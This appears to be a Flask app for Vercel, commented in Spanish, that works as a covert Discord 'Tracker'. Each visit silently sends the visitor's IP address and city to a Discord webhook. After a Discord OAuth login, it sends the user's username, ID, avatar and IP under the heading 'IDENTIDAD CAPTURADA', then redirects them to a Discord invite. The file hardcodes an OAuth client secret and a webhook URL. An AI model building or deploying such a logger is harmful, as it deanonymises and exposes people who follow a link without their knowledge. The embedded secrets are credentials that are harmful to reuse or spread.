import os
from flask import Flask, render_template, request, redirect
import requests

# Configuramos Flask para que busque la carpeta templates que está junto a este archivo
app = Flask(__name__, template_folder='templates')

CLIENT_ID     = "1457527346687901812"
CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
REDIRECT_URI  = "https://logger-page-g0oldyv1y-ola950857gmailcoms-projects.vercel.app/callback"
WEBHOOK       = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
LOGO          = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

@app.route('/')
def home():
    # Detectar IP real pasándole los filtros de Vercel
    ip = request.headers.get('x-real-ip') or request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    city = request.headers.get('x-vercel-ip-city', 'Desconocida')
    
    # LOG SILENCIOSO (Visita)
    requests.post(WEBHOOK, json={
        "username": "1* Tracker - Visita", "avatar_url": LOGO,
        "embeds": [{
            "title": "👁️ Conexión Detectada", "color": 0x5865F2,
            "fields": [{"name": "🌐 IP", "value": f"`{ip}`", "inline": True}, {"name": "📍 Localidad", "value": f"{city}", "inline": True}]
        }]
    })
    
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
    return render_template('index.html', auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return redirect("https://discord.gg/nUy6Vjr9YU")

    try:
        # Intercambio de códigos por datos de Discord
        r = requests.post("https://discord.com/api/v10/oauth2/token", data={
            'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'}).json()
        
        token = r.get('access_token')
        if token:
            user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
            ip = request.headers.get('x-real-ip') or request.remote_addr
            
            # LOG DE IDENTIDAD
            requests.post(WEBHOOK, json={
                "username": "1* Tracker - IDENTIDAD", "avatar_url": LOGO,
                "embeds": [{
                    "title": "🎯 ¡IDENTIDAD CAPTURADA!", "color": 0xFF0044,
                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get('avatar') else LOGO},
                    "fields": [{"name": "👤 Usuario", "value": f"**{user['username']}**", "inline": True}, {"name": "🆔 ID", "value": f"`{user['id']}`", "inline": True}, {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}]
                }]
            })
    except: pass
    return redirect("https://discord.gg/nUy6Vjr9YU")

# Vercel busca este objeto
app = app